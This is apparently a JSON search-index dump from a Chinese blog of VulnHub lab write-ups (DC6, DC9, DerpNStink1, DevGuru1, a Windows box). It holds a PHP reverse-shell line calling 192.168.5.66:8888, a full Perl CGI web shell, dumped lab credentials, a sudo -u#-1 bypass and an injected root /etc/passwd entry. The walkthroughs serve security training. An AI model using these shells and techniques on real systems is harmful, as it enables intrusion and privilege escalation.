/\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现很多用户：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb39e4e4f43672f559834e7b79fcd79e4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e先爆破看看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE29d55ac41c8976db30df7b0f779372daimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e同时ssh也开始爆破:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE577bee2726fbce1b3926c876150bbf80image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e作者，你真狗啊：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE15a69798209c2039cde23f10e61cedf0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE33597bbbbc5ceec1fefd48547fcc1978image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后台权限不是很高，查了一圈，发现已知漏洞：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaf51e671b8796657d83f9d97f35c7ee7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改目标和执行命令：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7b2b0e5016e034ae1b4be6c46db97d69image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdf07cda30ef9c066ed0bffadfac8f410image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e成功反弹shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0f96e09ca78c17a6e1c721d8c1dfd5d3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003emeErKatZ\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa959351142bbd8be46d9f12e69f5e8a6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个密码试过所有用户了，不行，登录数据库，看看里面的密码，很可惜，都不能解密：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf4a07d6acd2cb240f0217e2a68220b78image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e在mark的家里面发现了这个信息：\u003c/p\u003e\n\u003cp\u003e成功切换到graham用户：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE51b3e4b50347b80396c599bd345eb076image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现有sudo权限，那么我们可能需要提权到jens用户了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbf49e682b966ca898e95a1e62deed860image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看了一下backups.sh的权限，当前用户所属组有修改权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE646711169ecaf177acfd3e963595273bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e直接修改后提权：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8fbb1472a0e3e35aa5165e05e6c47c16image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc08f88d5f73492d49d21ffe8a3079095image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x072 DC6"},{"content":"这个靶机建议vm nat模式\n端口扫描 渗透 2个端口，很清晰：\n改一下hosts:\n发现sql注入：\n库名：\nStaff\n表名：\nStaffDetails,Users\n列名：\nUserID,Username,Password\n数据：\nPosition: 1Phone No: adminEmail: 856f5de590ef37314e7c3bdf6f8a66dc\n可解密：\ntransorbital1\n登录后台发现什么也没有：\n重新注入一个数据库：\nusers\nmarym,julied,fredf,barneyr,tomc,jerrym,wilmaf,bettyr,chandlerb,joeyt,rachelg,rossg,monicag,phoebeb,scoots,janitor,janitor2\n3kfs86sfd,468sfdfsd2,4sfd87sfd1,RocksOff,TC\u0026amp;TheBoyz,B8m#48sd,Pebbles,BamBam01,UrAG0D!,Passw0rd,yN72#dsd,ILoveRachel,3248dsds7s,smellycats,YR3BVxxxw87,Ilovepeepee,Hawaii-Five-0\n至此，数据库里面的所有内容，应该都被看完了，好像文件也写不进去：\n好家伙，原来管理员界面有个文件不存在，提示是文件包含：\n然后就是我知识盲区了，读取/proc/sched_debug 来查看Linux系统中任务的调度情况：\n发现一个叫做knockd的服务：\n而这个knockd服务是用来隐藏端口的：\nKnockd（也称为敲门守护进程）**是一个基于网络的安全工具，用于实现一种简单而有效的端口伪装和访问控制机制。它允许用户通过在特定的顺序按“敲门”（发送特定的网络请求）来触发服务器上的特定行为。当正确的敲门序列完成后，服务器将解锁指定的端口或服务，从而允许客户端进行连接。\n该服务的默认配置文件在/etc/knockd.conf下，利用文件包含进行读取：\n打开ssh，7469,8475,9842\n可以使用knock客户端，也可以使用nmap进行逐个端口扫描：\n可以看到现在ssh打开了：\n刚刚看到了passwd，可以知道有哪些用户可以登录，然后sql注入获取到的账号密码刚好是对应的，所以直接爆破：\n提权 看了一圈，没有gcc，没有sudo，没有suid，没有计划任务，然后在家目录下面找到了这个：\n做了一个passwd2密码本，重新爆破一次：\n可以知道fredf是系统管理员，那么这个账户提权成功概率应该是要高一些的：\nsudo 权限：\nstrings没有看出来什么东西，是个二进制可执行文件，但是根据提示可以知道，是python编写的：\n在系统中搜索源码文件：\n源码的意思，其实比较简单，读取第一个文件的内容，复制到第二个文件里面：\n其实就是一个追加命令：\n$1$1$Vx0Fbes5bJtXveDeV3s8e/\n用这玩意儿，替换原来root x的位置：\n然后删除中间那个root即可：\ncxk:$1$1$Vx0Fbes5bJtXveDeV3s8e/:0:0::/root:/bin/bash\n可以发现/etc/passwd后面多了一个cxk酶\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x073-dc9/","summary":"\u003cp\u003e这个靶机建议vm nat模式\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE977960ff23f1cfebfb6077563e543e05image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6f3e30f85f23583f61a257893db24b8aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc9d31a775c4b12a1c4c5da689aefb7f3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e2个端口，很清晰：\u003c/p\u003e\n\u003cp\u003e改一下hosts:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE75aec6ef0f889e466ea2b7cdff669d77image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现sql注入：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE27299d357da930e7467d12243cff24d5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e库名：\u003c/p\u003e\n\u003cp\u003eStaff\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7cb8e3b9324a0389f733a031fb565a28image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e表名：\u003c/p\u003e\n\u003cp\u003eStaffDetails,Users\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9ed3d5fd55a9f907c32277b0980b4068image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e列名：\u003c/p\u003e\n\u003cp\u003eUserID,Username,Password\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE219b99c235d8f84094ebfbb36af81861image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e数据：\u003c/p\u003e\n\u003cp\u003ePosition: 1\u003c!-- raw HTML omitted --\u003ePhone No: admin\u003c!-- raw HTML omitted --\u003eEmail: 856f5de590ef37314e7c3bdf6f8a66dc\u003c!-- raw HTML omitted --\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE938c3ffaf8aebcc7e41372fd3fb65416image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可解密：\u003c/p\u003e\n\u003cp\u003etransorbital1\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2792038bffb4355e7bf033374bee4a53image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录后台发现什么也没有：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd8bd9308b611dfc88e3eb8168e8d4e3dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e重新注入一个数据库：\u003c/p\u003e\n\u003cp\u003eusers\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6b3a1fa368f33d585e87f053d13d5376image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003emarym,julied,fredf,barneyr,tomc,jerrym,wilmaf,bettyr,chandlerb,joeyt,rachelg,rossg,monicag,phoebeb,scoots,janitor,janitor2\u003c/p\u003e\n\u003cp\u003e3kfs86sfd,468sfdfsd2,4sfd87sfd1,RocksOff,TC\u0026amp;TheBoyz,B8m#48sd,Pebbles,BamBam01,UrAG0D!,Passw0rd,yN72#dsd,ILoveRachel,3248dsds7s,smellycats,YR3BVxxxw87,Ilovepeepee,Hawaii-Five-0\u003c/p\u003e\n\u003cp\u003e至此，数据库里面的所有内容，应该都被看完了，好像文件也写不进去：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEddfb778407b1d6acaa3300059eb9127aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好家伙，原来管理员界面有个文件不存在，提示是文件包含：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf6a5ea3d600cc98905fb331bf0a9b5ceimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后就是我知识盲区了，读取/proc/sched_debug 来查看Linux系统中任务的调度情况：\u003c/p\u003e","title":"0x073 DC9"},{"content":"端口扫描 渗透测试 先看21端口：\n80端口：\n首页源码发现\n二级目录：\ngobuster：\n修改hosts访问：\nwpscan:\n插件：\n用户名：\n当前插件漏洞：\n当前版本应该是1.4.6，但是很可惜，是个后台漏洞：\n后台弱口令:admin/admin\n根据刚刚的插件漏洞，直接上传shell:\n或者手动传也是可以的：\n提权 家目录：\n翻查密码：\nwedgie57\n尝试成功：\n在家目录里面翻查了半天：\n我以为是另外一个用户的，没想到还是自己的：\n算了，有GCC，上脚本：\n然后是作者留下的路：\n在Documents下面有个pacp包，直接筛选，用wireshark太费时间：\n那就很舒服了：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x074-derpnstink1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1ad25f3af513423dda14b03983712467image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa3fd8424179526660ffeecdc2b404745image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEda526eff56628b7909d849afcee815aaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e先看21端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9f7c8e9ed9b0f451fd64108ef906fcefimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE442d118e755c3374824b4e24636ab1c5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e首页源码发现\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0c6e057bc38ecc5c7148cafcf17aaa2cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e二级目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE788c77bc986a3f50c2dfe00ff2acb9acimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003egobuster：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE164263042b6af447eda01fd9d8df3c0bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改hosts访问：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd7e5e68bf58a987ba8b6e0cbe29cc6feimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpscan:\u003c/p\u003e\n\u003cp\u003e插件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb3bc6732e8ea9f1607a778cff288dc39image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc70bff00f3331f6243c4ff5a8872ce36image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e当前插件漏洞：\u003c/p\u003e\n\u003cp\u003e当前版本应该是1.4.6，但是很可惜，是个后台漏洞：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0a83ffabd3e4e50f8550ae2791a9552bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后台弱口令:admin/admin\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd66edb68792f30c73f2124a1ff7933ebimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e根据刚刚的插件漏洞，直接上传shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE84c42e249a55cd66fb1ae8bce52f3191image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e或者手动传也是可以的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0f3329107e44b7bfae709eac386f7142image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1d7c3d27cb67e47cc7f1f5b9fddb66a3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e家目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE426dc1478cd8a8b6552796cc1f53059bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8f28abf1e2d822451bef40fd020afe24image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe8c63ef35b17ee4c89abf240eafe7f42image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e翻查密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE775b07842d5ef1f99bf24dd0863170baimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewedgie57\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7e6c2dc779e3e05bb1a1ca2981538371image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e尝试成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE499f3d34f3b2c403c165ba03b64eddb3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e在家目录里面翻查了半天：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0aa890d2dd53208bf8abbc4a59e86879image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e我以为是另外一个用户的，没想到还是自己的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7fdc73753d66d89beb422f5d3a9de97cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x074 DerpNStink1"},{"content":"端口扫描 渗透测试 发现.git目录，通过githack下载下来，然后发现了数据库账号密码：\n\u0026lsquo;database\u0026rsquo; =\u0026gt; \u0026lsquo;octoberdb\u0026rsquo;,\n\u0026lsquo;username\u0026rsquo; =\u0026gt; \u0026lsquo;october\u0026rsquo;,\n\u0026lsquo;password\u0026rsquo; =\u0026gt; \u0026lsquo;SQ66EBYx4GT3byXH\u0026rsquo;,\n同时gobuster发现：\nadminer页数据库管理工具\n登录成功：\n密码hash，但是很可惜，没查到：\n但是可以添加用户：\n然后又是小技巧了，hash id 和hash-identifier认不出来，但是百度是有案例的，直接把前面一截拿到百度搜：\n研究了半天这里的漏洞利用，查了资料原来是这里就可以直接修改代码执行：\nmarkup:\n{{ this.page.PoisonVar }}\ncode:\nfunction onStart()\n{\n$this-\u0026gt;page[\u0026ldquo;PoisonVar\u0026rdquo;] = exec(\u0026quot;/bin/bash -c \u0026lsquo;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.5.66/8888 0\u0026gt;\u0026amp;1\u0026rsquo;\u0026quot;);\n}\n点\n提权 秒了再说：\n看一下作者留下的提权路径：\n数据库：\n; Database to use. Either \u0026ldquo;mysql\u0026rdquo;, \u0026ldquo;postgres\u0026rdquo;, \u0026ldquo;mssql\u0026rdquo; or \u0026ldquo;sqlite3\u0026rdquo;.\nDB_TYPE = mysql\nHOST = 127.0.0.1:3306\nNAME = gitea\nUSER = gitea\n; Use PASSWD = your password for quoting if you use special characters in the password.\nPASSWD = UfFPTF8C8jjxVF2m\n这里可以用mysql命令行，也可以用之前的adminer，当然图形化好一点：\n修改密码为这个：\npbkdf2算法：\n123456\n4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb\n添加反弹shell:\n随便修改一个文件：\n就可以拿到\nsudo 提权：\n这里利用了CVE-2019-14287 sudo权限绕过漏洞，在允许使用所有用户，但是仅仅不允许使用root用户的时候可以尝试，加上\n-u#-1\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x075-devguru1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa6bd581c7fa48e8387927f35ab208b15image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc1ec935487287800c122de86ac7c5ca1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEab0eb3cd79e56fd6201ff24ccc811738image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e发现.git目录，通过githack下载下来，然后发现了数据库账号密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8dd235d87d2355774597af94e8fb30efimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u0026lsquo;database\u0026rsquo;   =\u0026gt; \u0026lsquo;octoberdb\u0026rsquo;,\u003c/p\u003e\n\u003cp\u003e\u0026lsquo;username\u0026rsquo;   =\u0026gt; \u0026lsquo;october\u0026rsquo;,\u003c/p\u003e\n\u003cp\u003e\u0026lsquo;password\u0026rsquo;   =\u0026gt; \u0026lsquo;SQ66EBYx4GT3byXH\u0026rsquo;,\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbf21fb3ee14daec200095b3a301244b8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e同时gobuster发现：\u003c/p\u003e\n\u003cp\u003eadminer页数据库管理工具\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3ced553e1389cd923303f402a70e2915image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE97a08d1024d194c8ab57d630ba5799b6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e密码hash，但是很可惜，没查到：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe0771862accbd7f518a859a72f8575cdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是可以添加用户：\u003c/p\u003e\n\u003cp\u003e然后又是小技巧了，hash id 和hash-identifier认不出来，但是百度是有案例的，直接把前面一截拿到百度搜：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE92ac5b683cd5ef0df12b828557a6c627image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd13a3917207d11119925f9abac161e5bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE94324b682221c4a4caa0ddaf3cc979e5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e研究了半天这里的漏洞利用，查了资料原来是这里就可以直接修改代码执行：\u003c/p\u003e\n\u003cp\u003emarkup:\u003c/p\u003e\n\u003cp\u003e{{ this.page.PoisonVar }}\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdc09ba803a04971615e53d09065fccecimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ecode:\u003c/p\u003e\n\u003cp\u003efunction onStart()\u003c/p\u003e\n\u003cp\u003e{\u003c/p\u003e\n\u003cp\u003e$this-\u0026gt;page[\u0026ldquo;PoisonVar\u0026rdquo;] = exec(\u0026quot;/bin/bash -c \u0026lsquo;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.5.66/8888 0\u0026gt;\u0026amp;1\u0026rsquo;\u0026quot;);\u003c/p\u003e\n\u003cp\u003e}\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8977ba30df11367a2b749669714d7359image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e点\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa76361b23e24377e0f540594b22e9401image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e秒了再说：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEed85c3d72e11a842fd81fdfb3eab3d46image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看一下作者留下的提权路径：\u003c/p\u003e","title":"0x075 DevGuru1"},{"content":"头一次打vulnhub的windows靶机，不太好配置啊：\n端口扫描 渗透 先看FTP：\n文件挺多的，但是都没读取权限：\n80端口也没扫出东西，这个root可能是80端口，然后看一下UPD的TFTP：\n随便尝试了一下：\n但是php反弹shell失败了，可能没有PHP的环境：\n这里查了一些资料，cgi程序：\n这些语言都可以实现，然后，poc如下：\nuse CGI;\ruse Cwd;\rprint CGI::header( -type =\u0026gt; \u0026#39;text/html\u0026#39; );\rmy $command = CGI::param(\u0026#39;command\u0026#39;);\rmy $pwd = CGI::param(\u0026#39;pwd\u0026#39;) || \u0026#39;\u0026#39;;\rmy $password = CGI::param(\u0026#39;password\u0026#39;);\rmy $filename = CGI-\u0026gt;script_name() ;\rif ( $password ne \u0026#39;yourpassword\u0026#39; ) {\rprint \u0026#34;Please provide a valid password.\\n\u0026#34;;\rexit(0)\r}\r$pwd = $pwd eq \u0026#39;\u0026#39; ? `pwd` : $pwd;\rmy $home = Cwd::cwd();\rchdir($pwd);\rmy $result=\u0026#39;\u0026#39;;\rif ($command =~ /^cd\\s*(.*)/) {\rmy $dir = $1 or \u0026#39;\u0026#39;;\rif ($dir eq \u0026#39;\u0026#39;) {\rchdir($home);\r} else {\rchdir($dir);\r}\r$pwd = Cwd::cwd(); $result = `ls -la`;\r} else {\r$result = `$command`;\r}\rprint \u0026lt;\u0026lt;EOF;\r\u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt;\r\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\r\u0026lt;meta content=\u0026#34;text/html; charset=ISO-8859-1\u0026#34; http-equiv=\u0026#34;content-type\u0026#34;\u0026gt;\u0026lt;title\u0026gt;console\u0026lt;/title\u0026gt;\r\u0026lt;script\u0026gt;\rwindow.onload = function(){\rdocument.getElementById(\u0026#34;command\u0026#34;).focus();\r}\r\u0026lt;/script\u0026gt;\r\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;\r.wide1 {\rborder-width: thick;\rwidth: 100%;\rheight: 600px;\r}\r.wide2 {\rsetFocus;\rborder-width: thick;\rwidth: 100%;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;\rScript: $filename PWD: $pwd \u0026lt;br/\u0026gt;\r\u0026lt;textarea class=\u0026#34;wide1\u0026#34; readonly=\u0026#34;readonly\u0026#34; cols=\u0026#34;1\u0026#34; rows=\u0026#34;1\u0026#34; name=\u0026#34;result\u0026#34;\u0026gt;\r$result\r\u0026lt;/textarea\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026#34;get\u0026#34; action=\u0026#34;$filename\u0026#34; name=\u0026#34;command\u0026#34;\u0026gt;Command:\u0026amp;nbsp;\r\u0026lt;input class=\u0026#34;wide2\u0026#34; name=\u0026#34;command\u0026#34; id=\u0026#34;command\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;input name=\u0026#34;password\u0026#34; value=\u0026#34;$password\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt;\r\u0026lt;input name=\u0026#34;pwd\u0026#34; value=\u0026#34;$pwd\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;br\u0026gt;\r\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\rEOF\rexit 0; 使用方式：\n查看防火墙状态：\nnetsh firewall show state 